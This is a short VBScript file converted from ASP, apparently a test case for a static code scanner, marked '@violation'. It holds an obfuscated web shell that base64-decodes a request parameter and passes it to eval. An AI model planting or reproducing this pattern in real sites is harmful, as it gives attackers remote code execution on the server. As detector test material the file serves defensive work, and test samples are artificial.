'****************************************************
'* Converted by ASPConv : ASP converter module      *
'*                         ( .asp -> .vbs )         *
'* Generate at: 2024-05-07 13:10:15                 *
'* Originated from D:\sparrow5\data\client\admin\analysis\1_checker_test\sparrow\sources\spsast2823.asp
'****************************************************

Dim ImgFile, ExtFile

Private Function Stream_BinaryToString(Binary)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "us-ascii"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function Base64Decode(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

ImgFile = Base64Decode(request("grey"))
ExtFile = request("rey")
If ExtFile = "" Then
eval (ImgFile) '@violation
Response.End
End If
